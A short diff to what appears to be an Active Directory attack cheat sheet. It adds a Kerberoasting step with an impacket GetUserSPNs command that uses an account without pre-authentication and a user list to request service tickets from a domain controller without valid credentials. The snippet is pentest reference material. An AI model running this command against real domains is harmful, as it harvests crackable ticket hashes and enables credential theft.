@@ -135,6 +135,12 @@ Kerberoasting:
 
 The attacker impersonates an account user with a service principal name (SPN) and requests a service-related ticket.
 
+Get without domain user / valid account:
+
+```bash
+impacket-GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-ip $TARGET_IP -dc-host "dc.$TARGET_AD" $TARGET_AD/
+```
+
 Check if vulnerable accounts are present:
 
 ```shell
